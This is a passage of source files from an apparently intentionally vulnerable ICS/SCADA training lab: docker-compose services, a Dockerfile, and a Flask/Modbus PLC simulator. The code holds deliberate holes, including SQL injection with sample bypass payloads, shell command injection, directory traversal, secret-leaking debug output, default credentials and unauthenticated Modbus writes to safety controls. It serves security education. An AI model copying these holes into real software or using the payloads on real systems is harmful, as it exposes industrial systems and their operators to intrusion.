        ipv4_address: 192.168.100.13
    restart: unless-stopped

  # =============================================================================
  # Historian Service (DMZ Network)
  # =============================================================================
  historian:
    build: .
    container_name: vuln-historian
    hostname: historian
    command: python core/historian.py
    ports:
      - "8888:8888"   # Web interface
    volumes:
      - ./logs:/app/logs
      - historian_db:/app/data
    environment:
      - FLASK_ENV=development
    networks:
      dmz_network:
        ipv4_address: 192.168.50.10
      ot_network:
        ipv4_address: 192.168.100.20
    restart: unless-stopped

  # =============================================================================
  # HMI Server (Visual SCADA Interface)
  # =============================================================================
  hmi_server:
    build: .
    container_name: vuln-hmi-server
    hostname: hmi-server
    command: python core/hmi_server.py
    ports:
      - "8000:8000"   # HMI Web interface
    volumes:
      - ./logs:/app/logs
    environment:
      - FLASK_ENV=development
    networks:
      dmz_network:
        ipv4_address: 192.168.50.15
      ot_network:
        ipv4_address: 192.168.100.25
    restart: unless-stopped

  # =============================================================================
  # Modbus IDS (Monitoring Network)
  # =============================================================================
  modbus_ids:
    build: .
    container_name: vuln-modbus-ids
    hostname: modbus-ids
    command: python monitoring/modbus_ids.py --monitor
    volumes:
      - ./logs:/app/logs
      - ./pcaps:/app/pcaps
      - ids_state:/tmp
    environment:
      - IDS_MODE=monitor
      - CAPTURE_PCAP=true
    networks:
      ot_network:
        ipv4_address: 192.168.100.30
    cap_add:
      - NET_ADMIN
      - NET_RAW
    restart: unless-stopped
    profiles:
      - full

  # =============================================================================
  # System Monitor Dashboard (Web Interface)
  # =============================================================================
  system_monitor:
    build: .
    container_name: vuln-system-monitor
    hostname: system-monitor
    command: python monitoring/system_monitor.py --web
    ports:
      - "5999:5999"   # Web dashboard
    volumes:
      - ./logs:/app/logs
      - monitor_state:/tmp
    environment:
      - MONITOR_MODE=web
    networks:
      dmz_network:
        ipv4_address: 192.168.50.20
      ot_network:
        ipv4_address: 192.168.100.40
    restart: unless-stopped

  # =============================================================================
  # Network Traffic Simulator (Optional - use with --profile full)
  # =============================================================================
  network_simulator:
    build: .
    container_name: vuln-network-sim
    hostname: network-sim
    command: python monitoring/network_simulator.py
    volumes:
      - ./logs:/app/logs
    environment:
      - SIM_MODE=realistic
    networks:
      ot_network:
        ipv4_address: 192.168.100.50
    restart: unless-stopped
    profiles:
      - full

  # =============================================================================
  # S7 Protocol Server (Optional - use with --profile full)
  # Requires privileged mode for port 102
  # =============================================================================
  s7_server:
    build: .
    container_name: vuln-s7-server
    hostname: s7-server
    command: python core/s7_server.py
    ports:
      - "102:102"     # S7 Protocol (requires root)
    volumes:
      - ./logs:/app/logs
      - s7_state:/tmp
    environment:
      - S7_MODE=educational
    networks:
      ot_network:
        ipv4_address: 192.168.100.60
    privileged: true
    restart: unless-stopped
    profiles:
      - full

# =============================================================================
# Network Definitions (Purdue Model)
# =============================================================================
networks:
  # OT Network (Operational Technology Zone - Level 0-1)
  ot_network:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.100.0/24
          gateway: 192.168.100.1

  # DMZ Network (Industrial DMZ - Level 3.5)
  dmz_network:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.50.0/24
          gateway: 192.168.50.1

# =============================================================================
# Persistent Volumes
# =============================================================================
volumes:
  plc1_state:
  plc2_state:
  plc3_state:
  plc4_state:
  shared_state:
  historian_db:
  ids_state:
  monitor_state:
  s7_state:



================================================================================
FILE: Dockerfile
================================================================================
FROM python:3.9-slim

LABEL maintainer="Security Training"
LABEL description="Vulnerable PLC Simulator for ICS/SCADA Security Testing"

# Install system dependencies for packet capture and networking tools
RUN apt-get update && apt-get install -y \
    gcc \
    libpcap-dev \
    tcpdump \
    net-tools \
    iputils-ping \
    sqlite3 \
    && rm -rf /var/lib/apt/lists/*

# Create app directory
WORKDIR /app

# Install Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy all application files
COPY core/ core/
COPY monitoring/ monitoring/
COPY scripts/ scripts/
COPY templates/ templates/
COPY docs/ docs/

# Create necessary directories
RUN mkdir -p /app/data /app/logs /app/pcaps /app/shared /tmp

# Expose ports for all services
# PLC web interfaces: 5000-5013
# Modbus TCP: 5502-5505
# Historian: 8888
# System Monitor: 5999
# S7 Protocol: 102
EXPOSE 5000 5011 5012 5013 5502 5503 5504 5505 8888 5999 102

# Default command (can be overridden in docker-compose)
CMD ["python", "start.py"]



================================================================================
FILE: core/app.py
================================================================================
#!/usr/bin/env python3
"""
Vulnerable Modbus PLC Simulator with Web Interface
For security testing and educational purposes only

INTENTIONALLY VULNERABLE - DO NOT USE IN PRODUCTION
Contains: SQL Injection, Default Creds, Command Injection, etc.
"""

from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash, make_response
from functools import wraps
import sqlite3
import csv
from io import StringIO
import os
import sys
import subprocess
import hashlib
from datetime import datetime, timedelta
import secrets
import random
import json
import socket
import threading
import struct
import uuid  # Task 6: for alarm ID generation
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import shared_state

app = Flask(__name__, template_folder='../templates')
app.secret_key = 'insecure-secret-key-12345'  # Intentionally weak

# Role-based access control decorator
def require_role(*allowed_roles):
    """Decorator to require specific roles for access"""
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if 'username' not in session:
                return redirect(url_for('login'))

            user_role = session.get('role', 'guest')

            # VULNERABILITY: Check can be bypassed by manipulating session
            if user_role not in allowed_roles:
                return jsonify({
                    'error': 'Access Denied',
                    'message': f'Insufficient privileges. Required: {", ".join(allowed_roles)}. Your role: {user_role}',
                    'required_role': list(allowed_roles),
                    'current_role': user_role
                }), 403

            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Initialize shared state on startup
shared_state.init_state()

# Backward compatibility - PROCESS_STATE now reads from shared state
class ProcessStateProxy:
    """Proxy object that reads/writes from shared state"""

    def __getitem__(self, key):
        return shared_state.get_state(key)

    def __setitem__(self, key, value):
        shared_state.update_state(key, value)

    def get(self, key, default=None):
        return shared_state.get_state(key, default)

    def __contains__(self, key):
        state = shared_state.load_state()
        return key in state

    def items(self):
        state = shared_state.load_state()
        return state.items()

    def keys(self):
        state = shared_state.load_state()
        return state.keys()

    def values(self):
        state = shared_state.load_state()
        return state.values()

    def update(self, other):
        state = shared_state.load_state()
        state.update(other)
        for key, value in other.items():
            shared_state.update_state(key, value)

# Global state for simulated process - now backed by shared storage
PROCESS_STATE = ProcessStateProxy()

# ============================================
# MODBUS TCP SERVER IMPLEMENTATION
# ============================================

class ModbusTCPServer:
    """
    Minimal Modbus TCP Server - Intentionally Vulnerable

    Implements realistic PLC function codes:
    - 0x01: Read Coils (digital outputs - pumps, valves, motors)
    - 0x03: Read Holding Registers (analog values - levels, temps, pressures)
    - 0x05: Write Single Coil (control single digital output)
    - 0x06: Write Single Register (set single analog value)
    - 0x0F: Write Multiple Coils (control multiple digital outputs)
    - 0x10: Write Multiple Registers (set multiple analog values)

    VULNERABILITIES (INTENTIONAL):
    - No authentication
    - No bounds checking
    - No input validation
    - Allows writing to any coil or register
    - No rate limiting (connection limit exists but is bypassable)
    - No logging of malicious activity
    """

    def __init__(self, host='0.0.0.0', port=5502, max_connections=50):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        # Connection semaphore - still DoS-able but requires more effort
        self.connection_semaphore = threading.Semaphore(max_connections)

    def start(self):
        """Start the Modbus TCP server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)  # Allow graceful shutdown
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[MODBUS] Server started on {self.host}:{self.port}")

            while self.running:
                try:
                    # Accept client connections
                    client_socket, address = self.server_socket.accept()
                    print(f"[MODBUS] Client connected from {address}")

                    # Use semaphore to limit concurrent connections
                    # Still vulnerable to DoS but requires more sophistication
                    client_thread = threading.Thread(
                        target=self._handle_client_with_semaphore,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except socket.timeout:
                    # Expected - allows checking self.running
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[MODBUS] Error accepting connection: {e}")

        except Exception as e:
            print(f"[MODBUS] Failed to start server: {e}")

    def stop(self):
        """Stop the Modbus TCP server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

    def recv_exact(self, sock, size):
        """
        Receive exactly 'size' bytes from socket (Task 1: reliability fix)
        recv() does not guarantee all bytes in one call - this fixes that.
        Prevents broken pipes and hangs with real Modbus tools.
        Returns None on timeout or disconnect (handled by caller).
        """
        data = b''
        while len(data) < size:
            try:
                chunk = sock.recv(size - len(data))
                if not chunk:
                    # Socket closed by peer
                    raise ConnectionError("Socket closed before receiving all data")
                data += chunk
            except socket.timeout:
                # Timeout - re-raise to be handled by caller
                raise
        return data

    def _handle_client_with_semaphore(self, client_socket, address):
        """Wrapper to handle client with connection semaphore"""
        with self.connection_semaphore:
            self.handle_client(client_socket, address)

    def handle_client(self, client_socket, address):
        """
        Handle a client connection (Task 1: improved stability)
        - Socket timeouts prevent hanging
        - Proper exception handling prevents crashes
        - Modbus exception responses instead of connection drops
        """
        try:
            # Task 1: Set socket timeout to prevent hanging
            client_socket.settimeout(30.0)  # 30 second timeout per operation

            while True:
                try:
                    # Read MBAP header (7 bytes) - use recv_exact for message safety
                    header = self.recv_exact(client_socket, 7)

                    # Parse MBAP header
                    transaction_id, protocol_id, length, unit_id = struct.unpack('>HHHB', header)

                    # Task 1: Validate MBAP header (but remain vulnerable for education)
                    if protocol_id != 0:
                        print(f"[MODBUS] WARNING: Non-standard protocol ID {protocol_id} from {address} (expected 0)")
                        # Note: Could send exception here, but we allow for educational purposes

                    # Task 1: Validate length is reasonable (2-260 bytes per Modbus spec)
                    if length < 2 or length > 260:
                        print(f"[MODBUS] WARNING: Invalid length {length} from {address}")
                        # Could send Modbus exception 0x04 (server failure), but we allow it

                    # Read PDU (Protocol Data Unit) - use recv_exact for message safety
                    pdu = self.recv_exact(client_socket, length - 1)  # -1 because unit_id already read

                    print(f"[MODBUS] Request from {address}: Trans={transaction_id}, Unit={unit_id}, PDU={pdu.hex()}")

                    # Parse function code
                    function_code = pdu[0]

                    # ATTACK DETECTION: Generate visual alert for write operations
                    self._detect_attack(address[0], function_code, pdu[1:])

                    # Process request and generate response
                    response_pdu = self.process_request(function_code, pdu[1:])

                    # Build MBAP response header
                    response_length = len(response_pdu) + 1  # +1 for unit_id
                    response_header = struct.pack('>HHHB', transaction_id, protocol_id, response_length, unit_id)

                    # Send response
                    response = response_header + response_pdu
                    client_socket.send(response)
                    print(f"[MODBUS] Response: {response.hex()}")

                except socket.timeout:
                    # Task 1: Client timed out - log and close gracefully
                    print(f"[MODBUS] Client {address} timed out after inactivity")
                    break
                except ConnectionError as e:
                    # Task 1: Connection lost - expected when client disconnects
                    print(f"[MODBUS] Connection lost with {address}: {e}")
                    break
                except struct.error as e:
                    # Task 1: Malformed Modbus packet - log but don't crash server
                    print(f"[MODBUS] Malformed packet from {address}: {e}")
                    break

        except Exception as e:
            # Task 1: Catch-all for unexpected errors - log and continue serving other clients
            print(f"[MODBUS] Unexpected error handling client {address}: {e}")
        finally:
            # Task 1: Always close socket cleanly
            try:
                client_socket.close()
            except:
                pass
            print(f"[MODBUS] Client {address} disconnected")

    def process_request(self, function_code, data):
        """Process Modbus request and return response PDU"""
        try:
            if function_code == 0x01:
                # Read Coils
                return self.read_coils(data)
            elif function_code == 0x03:
                # Read Holding Registers
                return self.read_holding_registers(data)
            elif function_code == 0x05:
                # Write Single Coil
                return self.write_single_coil(data)
            elif function_code == 0x06:
                # Write Single Register
                return self.write_single_register(data)
            elif function_code == 0x0F:
                # Write Multiple Coils
                return self.write_multiple_coils(data)
            elif function_code == 0x10:
                # Write Multiple Registers
                return self.write_multiple_registers(data)
            else:
                # Unsupported function code
                # VULNERABILITY: Should return proper exception, but we just echo
                return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x01)

        except Exception as e:
            print(f"[MODBUS] Error processing request: {e}")
            # Return exception response
            return struct.pack('B', function_code | 0x80) + struct.pack('B', 0x04)

    def read_holding_registers(self, data):
        """
        Function Code 0x03: Read Holding Registers
        Request: [start_addr(2)] [count(2)]
        Response: [0x03] [byte_count(1)] [values(2*count)]
        """
        # VULNERABILITY: No bounds checking on data length
        start_addr, count = struct.unpack('>HH', data[:4])

        print(f"[MODBUS] Read Holding Registers: addr={start_addr}, count={count}")

        # VULNERABILITY: No bounds checking on register range
        # Should validate count <= 125 and addresses exist

        # Read values from shared state using helper (Task 2)
        values = []
        for i in range(count):
            register = start_addr + i
            value = shared_state.get_register(register)  # Always 0-65535
            values.append(value)

        # Build response
        byte_count = count * 2
        response = struct.pack('BB', 0x03, byte_count)
        for value in values:
            response += struct.pack('>H', value)

        return response

    def write_single_register(self, data):
        """
        Function Code 0x06: Write Single Register
        Request: [addr(2)] [value(2)]
        Response: [0x06] [addr(2)] [value(2)] (echo)
        """
        # VULNERABILITY: No bounds checking
        addr, value = struct.unpack('>HH', data[:4])

        print(f"[MODBUS] Write Single Register: addr={addr}, value={value}")

        # VULNERABILITY: No authentication or authorization
        # Anyone can write any value to any register

        # Use unified helper to update register (Task 2)
        shared_state.set_register(addr, value)
        print(f"[MODBUS] Updated register {addr} = {value}")

        # Echo request as response
        return struct.pack('B', 0x06) + data[:4]

    def write_multiple_registers(self, data):
        """
        Function Code 0x10: Write Multiple Registers
        Request: [start_addr(2)] [count(2)] [byte_count(1)] [values(2*count)]
        Response: [0x10] [start_addr(2)] [count(2)]
        """
        # VULNERABILITY: No bounds checking
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])

        print(f"[MODBUS] Write Multiple Registers: addr={start_addr}, count={count}")

        # VULNERABILITY: No validation of byte_count == count*2
        # VULNERABILITY: No authentication

        # Parse values
        values_data = data[5:5+byte_count]
        values = []
        for i in range(count):
            value = struct.unpack('>H', values_data[i*2:(i+1)*2])[0]
            values.append(value)

        # Write to state using unified helper (Task 2)
        for i, value in enumerate(values):
            register = start_addr + i
            shared_state.set_register(register, value)
            print(f"[MODBUS] Updated register {register} = {value}")

        # Build response
        return struct.pack('>BHH', 0x10, start_addr, count)

    def read_coils(self, data):
        """
        Function Code 0x01: Read Coils
        Request: [start_addr(2)] [count(2)]
        Response: [0x01] [byte_count(1)] [coil_values(packed bits)]
        """
        start_addr, count = struct.unpack('>HH', data[:4])

        print(f"[MODBUS] Read Coils: addr={start_addr}, count={count}")

        # VULNERABILITY: No bounds checking
        # Read coil values from shared state using helper (Task 2)
        coil_values = []
        for i in range(count):
            coil = start_addr + i
            value = shared_state.get_coil(coil)  # Always returns 0 or 1
            coil_values.append(value)

        # Pack coils into bytes (8 coils per byte)
        byte_count = (count + 7) // 8  # Round up to nearest byte
        packed_bytes = []

        for byte_idx in range(byte_count):
            byte_val = 0
            for bit_idx in range(8):
                coil_idx = byte_idx * 8 + bit_idx
                if coil_idx < count and coil_values[coil_idx]:
                    byte_val |= (1 << bit_idx)
            packed_bytes.append(byte_val)

        # Build response
        response = struct.pack('BB', 0x01, byte_count)
        for byte_val in packed_bytes:
            response += struct.pack('B', byte_val)

        return response

    def write_single_coil(self, data):
        """
        Function Code 0x05: Write Single Coil
        Request: [addr(2)] [value(2)] - value is 0xFF00 (ON) or 0x0000 (OFF)
        Response: [0x05] [addr(2)] [value(2)] (echo)
        """
        addr, value = struct.unpack('>HH', data[:4])

        # Value should be 0xFF00 (ON) or 0x0000 (OFF)
        coil_state = (value == 0xFF00)

        print(f"[MODBUS] Write Single Coil: addr={addr}, value={coil_state}")

        # VULNERABILITY: No authentication or authorization
        # Use unified helper to update coil (Task 2)
        shared_state.set_coil(addr, coil_state)
        print(f"[MODBUS] Updated coil {addr} = {coil_state}")

        # Echo request as response
        return struct.pack('B', 0x05) + data[:4]

    def write_multiple_coils(self, data):
        """
        Function Code 0x0F: Write Multiple Coils
        Request: [start_addr(2)] [count(2)] [byte_count(1)] [coil_values(packed bits)]
        Response: [0x0F] [start_addr(2)] [count(2)]
        """
        start_addr, count, byte_count = struct.unpack('>HHB', data[:5])

        print(f"[MODBUS] Write Multiple Coils: addr={start_addr}, count={count}")

        # VULNERABILITY: No validation of byte_count
        # VULNERABILITY: No authentication

        # Parse packed coil values
        coil_bytes = data[5:5+byte_count]
        coil_values = []

        for byte_idx in range(byte_count):
            byte_val = coil_bytes[byte_idx]
            for bit_idx in range(8):
                if len(coil_values) < count:
                    coil_values.append(bool(byte_val & (1 << bit_idx)))

        # Write to state using unified helper (Task 2)
        for i, value in enumerate(coil_values[:count]):
            coil = start_addr + i
            shared_state.set_coil(coil, value)
            print(f"[MODBUS] Updated coil {coil} = {value}")

        # Build response
        return struct.pack('>BHH', 0x0F, start_addr, count)

    def _detect_attack(self, source_ip, function_code, data):
        """
        Detect potential attacks and generate visual alerts
        Educational IDS - shows users when their attacks are detected!
        """
        try:
            # Parse address from request data
            address = 0
            if len(data) >= 2:
                address = struct.unpack('>H', data[:2])[0]

            alert = None

            # Detection Rule 1: Write operations (potential attack)
            if function_code in [0x05, 0x06, 0x0F, 0x10]:
                severity = "WARNING"
                alert_type = "UNAUTHORIZED_WRITE"

                # Determine what was written
                target = ""
                if function_code == 0x05:
                    target = f"coil {address}"
                elif function_code == 0x06:
                    target = f"register {address}"
                elif function_code == 0x0F:
                    target = f"multiple coils starting at {address}"
                elif function_code == 0x10:
                    target = f"multiple registers starting at {address}"

                message = f"PLC-1: Modbus write to {target} from {source_ip}"

                # Critical addresses (Task 3: aligned with documentation)
                # Coil 0 = Pump 1, Coil 3 = Valve 1 (main tank controls)
                # Coil 10 = Emergency Stop, Coil 11 = Safety Interlock
                if address in [0, 3, 10, 11]:  # Pump, valve, emergency stop, safety interlock
                    severity = "CRITICAL"
                    alert_type = "SAFETY_SYSTEM_TAMPER"
                    message = f"ðŸš¨ CRITICAL: PLC-1 Tank system tampered! Write to {target} from {source_ip}"

                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': severity,
                    'type': alert_type,
                    'message': message,
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': address,
                    'plc': 'PLC-1'
                }

            # Detection Rule 2: Invalid function codes
            elif function_code not in [0x01, 0x03, 0x05, 0x06, 0x0F, 0x10]:
                alert = {
                    'timestamp': datetime.now().strftime('%H:%M:%S'),
                    'severity': 'HIGH',
                    'type': 'INVALID_FUNCTION_CODE',
                    'message': f"PLC-1: Invalid Modbus function code 0x{function_code:02X} from {source_ip}",
                    'source_ip': source_ip,
                    'function_code': function_code,
                    'address': 0,
                    'plc': 'PLC-1'
                }

            # Store alert in shared state for visual display
            if alert:
                alerts = shared_state.get_state('security_alerts', [])
                alerts.append(alert)

                # Keep only last 50 alerts
                if len(alerts) > 50:
                    alerts = alerts[-50:]

                shared_state.update_state('security_alerts', alerts)
                print(f"[SECURITY] {alert['severity']}: {alert['message']}")

        except Exception as e:
            print(f"[SECURITY] Error detecting attack: {e}")

# Global Modbus server instance
modbus_server = None

def start_modbus_server():
    """Start Modbus TCP server in background thread"""
    global modbus_server
    modbus_server = ModbusTCPServer(host='0.0.0.0', port=5502)
    server_thread = threading.Thread(target=modbus_server.start, daemon=True)
    server_thread.start()
    print("[MODBUS] Background thread started")

# Initialize database (Task 7: improved safety)
def init_db():
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, role TEXT)''')

    # Insert default users (intentionally vulnerable) - Task 7: explicit columns
    c.execute("DELETE FROM users")
    c.execute("INSERT INTO users (id, username, password, role) VALUES (?, ?, ?, ?)",
              (1, 'admin', 'admin', 'admin'))
    c.execute("INSERT INTO users (id, username, password, role) VALUES (?, ?, ?, ?)",
              (2, 'operator', 'operator123', 'operator'))
    c.execute("INSERT INTO users (id, username, password, role) VALUES (?, ?, ?, ?)",
              (3, 'guest', 'guest', 'guest'))

    # PLC data table - Task 7: UNIQUE constraint on register for upsert
    c.execute('''CREATE TABLE IF NOT EXISTS plc_data
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  register TEXT UNIQUE NOT NULL,
                  value INTEGER NOT NULL,
                  timestamp TEXT NOT NULL)''')

    # Logs table
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT NOT NULL,
                  user TEXT NOT NULL,
                  action TEXT NOT NULL,
                  details TEXT)''')

    conn.commit()
    conn.close()

def log_action(user, action, details):
    """Log user actions"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO logs (timestamp, user, action, details) VALUES (?, ?, ?, ?)",
              (timestamp, user, action, details))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABILITY: SQL Injection
        # Intentionally vulnerable query - no parameterization
        # Multiple ways to exploit:
        # 1. admin' OR '1'='1' --
        # 2. admin' OR 1=1 --
        # 3. ' OR ''='
        # 4. admin'--
        conn = sqlite3.connect('plc.db')
        c = conn.cursor()
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

        try:
            print(f"[SQL] Executing: {query}")  # Debug output
            c.execute(query)
            user = c.fetchone()
            print(f"[SQL] Result: {user}")  # Debug output

            if user:
                session['username'] = user[1]
                session['role'] = user[3]
                session['user_id'] = user[0]
                log_action(user[1], 'login', 'Successful login')
                conn.close()
                return redirect(url_for('dashboard'))
            else:
                error = 'Invalid credentials'
                if username:
                    log_action(username, 'login_failed', 'Failed login attempt')

            conn.close()
        except Exception as e:
            error = f'Database error: {str(e)}'
            print(f"[SQL] Error: {str(e)}")
            conn.close()

    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    user = session.get('username', 'unknown')
    log_action(user, 'logout', 'User logged out')
    session.clear()
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('dashboard.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/admin')
@require_role('admin')
def admin():
    """Admin panel - requires admin role"""
    return render_template('admin.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/admin/users')
@require_role('admin')
def admin_users():
    """View users - admin only"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("SELECT id, username, role FROM users")
    users = c.fetchall()
    conn.close()

    return render_template('users.html', users=users)

@app.route('/admin/users/add', methods=['POST'])
@require_role('admin')
def admin_add_user():
    """Add new user - admin only"""
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    role = request.form.get('role', 'guest')

    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    try:
        # VULNERABILITY: Password stored in plaintext
        c.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                 (username, password, role))
        conn.commit()
        log_action(session['username'], 'add_user', f'Added user: {username} with role: {role}')
        conn.close()
        return jsonify({'success': True, 'message': f'User {username} added successfully'})
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({'error': 'Username already exists'}), 400
    except Exception as e:
        conn.close()
        return jsonify({'error': str(e)}), 500

@app.route('/admin/users/delete/<int:user_id>', methods=['POST'])
@require_role('admin')
def admin_delete_user(user_id):
    """Delete user - admin only"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # Get username before deleting
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    result = c.fetchone()

    if not result:
        conn.close()
        return jsonify({'error': 'User not found'}), 404

    username = result[0]

    # VULNERABILITY: No check to prevent deleting own account
    c.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

    log_action(session['username'], 'delete_user', f'Deleted user: {username}')
    return jsonify({'success': True, 'message': f'User {username} deleted'})

@app.route('/admin/users/edit/<int:user_id>', methods=['POST'])
@require_role('admin')
def admin_edit_user(user_id):
    """Edit user role - admin only"""
    new_role = request.form.get('role', '')

    if new_role not in ['admin', 'operator', 'guest']:
        return jsonify({'error': 'Invalid role'}), 400

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # Get username before editing
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    result = c.fetchone()

    if not result:
        conn.close()
        return jsonify({'error': 'User not found'}), 404

    username = result[0]

    # VULNERABILITY: No check to prevent demoting own admin account
    c.execute("UPDATE users SET role = ? WHERE id = ?", (new_role, user_id))
    conn.commit()
    conn.close()

    log_action(session['username'], 'edit_user', f'Changed {username} role to {new_role}')
    return jsonify({'success': True, 'message': f'User {username} updated to {new_role}'})

@app.route('/admin/logs')
@require_role('admin')
def admin_logs():
    """View all logs - admin only"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 100")
    logs = c.fetchall()
    conn.close()

    return render_template('logs.html', logs=logs)

@app.route('/operator/logs')
@require_role('admin', 'operator')
def operator_logs():
    """View own logs - operator can only see their own actions"""
    if 'username' not in session:
        return redirect(url_for('login'))

    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # VULNERABILITY: SQL Injection in user filter (blind SQLi)
    username = session.get('username', '')
    query = f"SELECT * FROM logs WHERE user='{username}' ORDER BY id DESC LIMIT 100"

    try:
        c.execute(query)
        logs = c.fetchall()
    except:
        logs = []

    conn.close()

    return render_template('operator_logs.html',
                          logs=logs,
                          username=session.get('username'),
                          role=session.get('role'))

@app.route('/admin/system')
@require_role('admin')
def admin_system():
    """System control - admin only"""
    return render_template('system.html')

@app.route('/admin/exec', methods=['POST'])
@require_role('admin')
def admin_exec():
    """VULNERABILITY: Command Injection - admin only"""
    command = request.form.get('command', '')

    try:
        # VULNERABILITY: No input validation - direct command execution
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5)
        output = result.decode('utf-8')
        log_action(session['username'], 'exec_command', command)
        return jsonify({'output': output})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/plc/status')
def plc_status():
    """Get PLC status"""
    return jsonify({
        'status': 'running',
        'model': 'VulnPLC-3000',
        'firmware': '1.0.0',
        'uptime': '42 days',
        'modbus_port': 5502,
        'registers': 100
    })

@app.route('/api/plc/read/<int:register>')
def plc_read(register):
    """Read PLC register"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    # Simulate reading from Modbus
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    c.execute("SELECT value FROM plc_data WHERE register=?", (str(register),))
    result = c.fetchone()
    conn.close()

    if result:
        value = result[0]
    else:
        value = 0

    return jsonify({'register': register, 'value': value})

@app.route('/api/plc/write/<int:register>/<int:value>')
@require_role('admin', 'operator')
def plc_write(register, value):
    """Write to PLC register - operator and admin only"""
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    # Task 7: Explicit column names + upsert by register (UNIQUE constraint)
    c.execute("INSERT OR REPLACE INTO plc_data (register, value, timestamp) VALUES (?, ?, ?)",
              (str(register), value, timestamp))
    conn.commit()
    conn.close()

    log_action(session['username'], 'write_register', f'Register {register} = {value}')

    return jsonify({'success': True, 'register': register, 'value': value})

@app.route('/debug')
def debug():
    """VULNERABILITY: Information disclosure"""
    info = {
        'session': dict(session),
        'environment': dict(os.environ),
        'secret_key': app.secret_key,
        'debug_mode': app.debug
    }
    return jsonify(info)

@app.route('/backup/<path:filename>')
def backup(filename):
    """VULNERABILITY: Directory traversal"""
    # No path validation - allows reading arbitrary files
    try:
        with open(filename, 'r') as f:
            content = f.read()
        return content
    except Exception as e:
        return f"Error: {str(e)}", 404

@app.route('/hmi')
def hmi():
    """HMI (Human-Machine Interface) - Real-time monitoring"""
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('hmi.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/scada')
def scada():
    """SCADA Dashboard with process overview"""
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('scada.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/process')
def process():
    """Process control interface"""
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('process.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/alarms')
def alarms():
    """Alarm management interface"""
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('alarms.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/trending')
def trending():
    """Historical data trending"""
    if 'username' not in session:
        return redirect(url_for('login'))

    return render_template('trending.html',
                          username=session['username'],
                          role=session['role'])

@app.route('/api/process/status')
def process_status():
    """Get current process status"""
    if 'username' not in session:
        return jsonify({'error': 'Not authenticated'}), 401

    # Task 5: Type-safe process simulation mutations
    # Validate types before mutating to prevent corruption

    # Simulate Tank 1 changes
    tank1_level = PROCESS_STATE.get('tank1_level', 50.0)
    if not isinstance(tank1_level, (int, float)):
        tank1_level = 50.0  # Reset to safe default
    PROCESS_STATE['tank1_level'] = max(0, min(100, tank1_level + random.uniform(-2, 2)))

    tank1_temp = PROCESS_STATE.get('tank1_temp', 25.0)
    if not isinstance(tank1_temp, (int, float)):
        tank1_temp = 25.0
    PROCESS_STATE['tank1_temp'] = max(20, min(100, tank1_temp + random.uniform(-0.5, 0.5)))

